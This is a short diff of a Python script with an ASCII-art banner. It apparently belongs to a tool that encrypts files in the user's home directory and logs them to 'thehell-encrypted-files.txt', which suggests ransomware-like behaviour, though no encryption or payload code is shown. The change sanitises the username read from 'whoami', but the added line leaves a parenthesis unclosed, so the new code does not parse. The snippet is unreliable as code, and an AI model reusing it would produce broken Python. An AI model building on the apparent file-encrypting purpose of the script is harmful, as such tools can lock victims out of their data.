@@ -10,7 +10,7 @@ ASCII = """
 ░░░╚═╝░░░╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝╚══════╝╚══════╝╚══════╝
 """
 
-USERNAME = popen("whoami").read()
+USERNAME = ''.join(filter(str.isalnum, popen("whoami").read())
 SOURCE_DIR = f"/home/{USERNAME}/"
 ENCRYPTED_FILES_LOG = path.join(SOURCE_DIR, "thehell-encrypted-files.txt")
 TESTING_FILE = path.join(SOURCE_DIR, "thehell-enryption-test.txt")
